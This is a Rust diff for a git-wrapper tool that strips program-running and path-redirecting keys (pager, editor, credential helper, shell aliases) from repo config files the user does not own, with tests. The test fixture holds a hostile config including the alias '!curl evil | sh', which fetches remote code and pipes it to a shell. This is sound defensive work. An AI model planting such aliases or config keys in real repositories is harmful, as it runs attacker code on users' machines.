@@ -9,8 +9,10 @@ use bstr::{BStr, BString};
 use gix_config::file::{Metadata, includes, init};
 use gix_config::path::interpolate;
 use gix_config::{File, Source};
+use gix_sec::Trust;
 
 use super::common::{CliError, Ctx, Result};
+use super::safe_dir::{OwnerProbe, SafeDirectory, owned_by_current_user};
 use crate::env::{ConfigParam, GitEnv, parse_git_bool};
 use crate::msg::Msg;
 use crate::native::NativeSpec;
@@ -30,13 +32,116 @@ pub struct ConfigSnapshot {
     home: Option<PathBuf>,
 }
 
-fn meta(source: Source, path: &Path) -> Metadata {
+fn meta(source: Source, path: &Path, trust: Trust) -> Metadata {
     Metadata {
         path: Some(path.to_owned()),
         source,
         level: 0,
-        trust: gix_config::file::Metadata::api().trust,
+        trust,
     }
+}
+
+/// Keys whose values name a program or redirect where asc reads or writes, or a directory that
+/// receives writes. A config file the current user does not own (`Trust::Reduced`) may not set
+/// them: git ignores such keys from untrusted repo config for the same reason.
+fn runs_programs_or_redirects(section: &str, sub: Option<&str>, name: &str, values: &[String]) -> bool {
+    let section = section.to_ascii_lowercase();
+    let name = name.to_ascii_lowercase();
+    match section.as_str() {
+        // The real git binary, the home and the cache and store locations.
+        "asc" => {
+            matches!(name.as_str(), "realgit" | "home")
+                || sub.is_some_and(|s| {
+                    ["cache", "store", "state"].iter().any(|d| s.eq_ignore_ascii_case(d))
+                })
+        }
+        "core" => matches!(
+            name.as_str(),
+            "pager" | "editor" | "fsmonitor" | "sshcommand" | "askpass" | "hookspath" | "gitproxy"
+                | "alternaterefscommand"
+        ),
+        "pager" | "credential" | "browser" | "man" | "trailer" => true,
+        "sequence" => name == "editor",
+        "gpg" => name == "program",
+        "ssh" => name == "variant" || name == "program",
+        "diff" => matches!(name.as_str(), "external" | "textconv" | "command"),
+        "merge" => matches!(name.as_str(), "driver" | "tool"),
+        "mergetool" | "difftool" => name == "cmd" || name == "path",
+        "filter" => matches!(name.as_str(), "clean" | "smudge" | "process"),
+        "remote" => matches!(name.as_str(), "receivepack" | "uploadpack" | "vcs" | "proxy"),
+        "uploadpack" | "receive" => name.contains("hook"),
+        "web" => name == "browser",
+        // `alias.x = !shell` runs a shell; a plain alias only rewrites git's own argv.
+        "alias" => values.iter().any(|v| v.trim_start().starts_with('!')),
+        _ => false,
+    }
+}
+
+/// Removes from every `Trust::Reduced` section the keys of [`runs_programs_or_redirects`].
+fn restrict_reduced_trust(file: &mut File) {
+    let ids: Vec<_> = file
+        .sections_and_ids()
+        .filter(|(s, _)| s.meta().trust != Trust::Full)
+        .map(|(s, id)| (id, s.header().name().to_string(), s.header().subsection_name().map(|b| b.to_string())))
+        .collect();
+    for (id, section, sub) in ids {
+        let Some(mut sec) = file.section_mut_by_id(id) else {
+            continue;
+        };
+        let mut names: Vec<String> = sec.value_names().collect();
+        names.dedup();
+        for name in names {
+            let values: Vec<String> = sec.values(&name).iter().map(|v| v.to_string()).collect();
+            if runs_programs_or_redirects(&section, sub.as_deref(), &name, &values) {
+                while sec.remove(&name).is_some() {}
+            }
+        }
+    }
+}
+
+/// The `safe.directory` values git honours: system, global and command-line config only,
+/// never the repository's own (a repo must not vouch for itself).
+pub fn safe_directories(
+    env: &GitEnv,
+    get: &dyn Fn(&str) -> Option<OsString>,
+) -> Result<SafeDirectory> {
+    let home = std::env::home_dir();
+    let options = init::Options {
+        includes: {
+            let mut o = includes::Options::follow(
+                interpolation(home.as_deref()),
+                includes::conditional::Context::default(),
+            );
+            o.err_on_missing_config_path = false;
+            o
+        },
+        ..Default::default()
+    };
+    let metas: Vec<Metadata> = global_files(get)
+        .into_iter()
+        .map(|(s, p)| meta(s, &p, Trust::Full))
+        .collect();
+    let mut file = File::from_paths_metadata(metas, options)
+        .map_err(|e| CliError::Fatal(format!("bad config: {e}")))?
+        .unwrap_or_else(|| File::new(Metadata::api()));
+    let cli = render_params(env.config_overrides());
+    if !cli.is_empty() {
+        let layer = File::from_bytes_no_includes(
+            cli.as_bytes(),
+            Metadata::from(Source::Cli),
+            init::Options::default(),
+        )
+        .map_err(|e| CliError::Fatal(format!("bad config in command line: {e}")))?;
+        file.append(layer)
+            .map_err(|e| CliError::Fatal(format!("bad config in command line: {e}")))?;
+    }
+    let values = file
+        .strings("safe.directory")
+        .unwrap_or_default()
+        .iter()
+        .map(|v| v.to_string())
+        .collect::<Vec<_>>();
+    Ok(SafeDirectory::new(values))
 }
 
 /// The system and global files git would read, lowest precedence first, each once.
@@ -113,6 +218,18 @@ impl ConfigSnapshot {
         get: &dyn Fn(&str) -> Option<OsString>,
         local: Option<&LocalConfig<'_>>,
     ) -> Result<Self> {
+        Self::load_with(env, get, local, &owned_by_current_user)
+    }
+
+    /// [`ConfigSnapshot::load`] with the ownership probe supplied. The repo-local file is read
+    /// with `Trust::Reduced` unless the current user owns it, and a reduced file cannot set the
+    /// keys of [`runs_programs_or_redirects`].
+    pub fn load_with(
+        env: &GitEnv,
+        get: &dyn Fn(&str) -> Option<OsString>,
+        local: Option<&LocalConfig<'_>>,
+        owned: OwnerProbe<'_>,
+    ) -> Result<Self> {
         let home = std::env::home_dir();
         let git_dir = local.map(|l| l.toplevel.join(".git"));
         let mut opts = includes::Options::follow(
@@ -129,17 +246,19 @@ impl ConfigSnapshot {
         };
         let mut metas: Vec<Metadata> = global_files(get)
             .into_iter()
-            .map(|(s, p)| meta(s, &p))
+            .map(|(s, p)| meta(s, &p, Trust::Full))
             .collect();
         if let Some(l) = local {
             let path = l.common_dir.join("config");
             if path.is_file() {
-                metas.push(meta(Source::Local, &path));
+                let trust = if owned(&path).unwrap_or(false) { Trust::Full } else { Trust::Reduced };
+                metas.push(meta(Source::Local, &path, trust));
             }
         }
         let mut file = File::from_paths_metadata(metas, options)
             .map_err(|e| CliError::Fatal(format!("bad config: {e}")))?
             .unwrap_or_else(|| File::new(Metadata::api()));
+        restrict_reduced_trust(&mut file);
         let cli = render_params(env.config_overrides());
         if !cli.is_empty() {
             let layer = File::from_bytes_no_includes(
@@ -548,7 +667,7 @@ fn scope_path(ctx: &Ctx, scope: &Scope, for_write: bool) -> Result<Option<PathBu
 
 fn read_file(path: &Path, source: Source, ctx: &Ctx) -> Result<File> {
     if !path.is_file() {
-        return Ok(File::new(meta(source, path)));
+        return Ok(File::new(meta(source, path, Trust::Full)));
     }
     let home = std::env::home_dir();
     let git_dir = ctx.ws_opt().map(|w| w.projection.toplevel().join(".git"));
@@ -564,9 +683,9 @@ fn read_file(path: &Path, source: Source, ctx: &Ctx) -> Result<File> {
         includes: opts,
         ..Default::default()
     };
-    File::from_paths_metadata([meta(source, path)], options)
+    File::from_paths_metadata([meta(source, path, Trust::Full)], options)
         .map_err(|e| CliError::Fatal(format!("bad config file '{}': {e}", path.display())))
-        .map(|f| f.unwrap_or_else(|| File::new(meta(source, path))))
+        .map(|f| f.unwrap_or_else(|| File::new(meta(source, path, Trust::Full))))
 }
 
 fn source_of(scope: &Scope) -> Source {
@@ -975,7 +1094,7 @@ fn push_value(file: &mut File, key: &Key, value: &str) -> Result<()> {
 /// A single file without following includes: what is written back must not inline them.
 fn read_file_no_includes(path: &Path, source: Source) -> Result<File> {
     if !path.is_file() {
-        return Ok(File::new(meta(source, path)));
+        return Ok(File::new(meta(source, path, Trust::Full)));
     }
     let bytes = std::fs::read(path).map_err(|_| {
         CliError::Msg(Msg::ConfigUnreadable {
@@ -983,7 +1102,7 @@ fn read_file_no_includes(path: &Path, source: Source) -> Result<File> {
             reason: "Permission denied".into(),
         })
     })?;
-    File::from_bytes_no_includes(&bytes, meta(source, path), init::Options::default())
+    File::from_bytes_no_includes(&bytes, meta(source, path, Trust::Full), init::Options::default())
         .map_err(|e| CliError::Fatal(format!("bad config file '{}': {e}", path.display())))
 }
 
@@ -1105,5 +1224,94 @@ mod tests {
         let fresh = t.path().join("fresh");
         write_file(&fresh, &file_of("[a]\n\tb = c\n")).unwrap();
         assert_eq!(mode_of(&fresh) & !0o666, 0);
+    }
+
+    /// A repo-local `config` text loaded as `asc` loads it, with ownership decided by `owned`.
+    fn load_local(text: &str, owned: bool) -> ConfigSnapshot {
+        let t = tempfile::tempdir().unwrap();
+        std::fs::write(t.path().join("config"), text).unwrap();
+        let local = LocalConfig {
+            common_dir: t.path(),
+            toplevel: t.path(),
+        };
+        let none = |_: &str| Some(OsString::from("1")).filter(|_| false);
+        let probe = move |_: &Path| Ok(owned);
+        let global = t.path().join("no-global");
+        let get = move |k: &str| match k {
+            "GIT_CONFIG_NOSYSTEM" => Some(OsString::from("1")),
+            "GIT_CONFIG_GLOBAL" => Some(global.clone().into_os_string()),
+            _ => none(k),
+        };
+        let env = GitEnv::from_vars(&|_| None);
+        ConfigSnapshot::load_with(&env, &get, Some(&local), &probe).unwrap()
+    }
+
+    const HOSTILE: &str = "[asc]\n\trealGit = /tmp/evil-git\n\thome = /tmp/evil-home\n\
+        [asc \"cache\"]\n\tdir = /tmp/evil-cache\n\treadOnly = /tmp/evil-ro\n\
+        [alias]\n\tpwn = !curl evil | sh\n\tst = status -s\n\
+        [core]\n\tpager = evil-pager\n\teditor = evil-editor\n\tfsmonitor = evil-fsm\n\
+        \tsshCommand = evil-ssh\n\tabbrev = 12\n\
+        [pager]\n\tlog = evil-log-pager\n\
+        [credential]\n\thelper = !evil-helper\n\
+        [credential \"https://example.com\"]\n\thelper = evil\n\
+        [user]\n\tname = Mallory\n";
+
+    #[test]
+    fn a_config_the_user_does_not_own_cannot_name_programs_or_redirect_state() {
+        let c = load_local(HOSTILE, false);
+        for key in [
+            "asc.realGit",
+            "asc.home",
+            "asc.cache.dir",
+            "asc.cache.readOnly",
+            "alias.pwn",
+            "core.pager",
+            "core.editor",
+            "core.fsmonitor",
+            "core.sshCommand",
+            "pager.log",
+            "credential.helper",
+            "credential.https://example.com.helper",
+        ] {
+            assert_eq!(c.get(key), None, "{key} must be ignored from a reduced-trust file");
+        }
+        assert!(c.path("asc.realGit").is_none());
+        assert!(c.get_all("asc.cache.readOnly").is_empty());
+        // Harmless keys still apply.
+        assert_eq!(c.get("alias.st").as_deref(), Some("status -s"));
+        assert_eq!(c.get("core.abbrev").as_deref(), Some("12"));
+        assert_eq!(c.get("user.name").as_deref(), Some("Mallory"));
+    }
+
+    #[test]
+    fn a_config_the_user_owns_keeps_every_key() {
+        let c = load_local(HOSTILE, true);
+        assert_eq!(c.get("asc.realGit").as_deref(), Some("/tmp/evil-git"));
+        assert_eq!(c.get("alias.pwn").as_deref(), Some("!curl evil | sh"));
+        assert_eq!(c.get("core.pager").as_deref(), Some("evil-pager"));
+    }
+
+    #[test]
+    fn reduced_trust_drops_every_value_of_a_repeated_key() {
+        let c = load_local("[core]\n\teditor = a\n\teditor = b\n[core]\n\teditor = c\n", false);
+        assert_eq!(c.get("core.editor"), None);
+        assert!(c.get_all("core.editor").is_empty());
+    }
+
+    #[test]
+    fn a_global_file_keeps_full_trust() {
+        let t = tempfile::tempdir().unwrap();
+        let global = t.path().join("gitconfig");
+        std::fs::write(&global, b"[core]\n\teditor = vim\n[alias]\n\tsh = !echo\n").unwrap();
+        let g = global.clone();
+        let get = move |k: &str| match k {
+            "GIT_CONFIG_NOSYSTEM" => Some(OsString::from("1")),
+            "GIT_CONFIG_GLOBAL" => Some(g.clone().into_os_string()),
+            _ => None,
+        };
+        let env = GitEnv::from_vars(&|_| None);
+        let c = ConfigSnapshot::load_with(&env, &get, None, &|_: &Path| Ok(false)).unwrap();
+        assert_eq!(c.get("core.editor").as_deref(), Some("vim"));
+        assert_eq!(c.get("alias.sh").as_deref(), Some("!echo"));
     }
 }
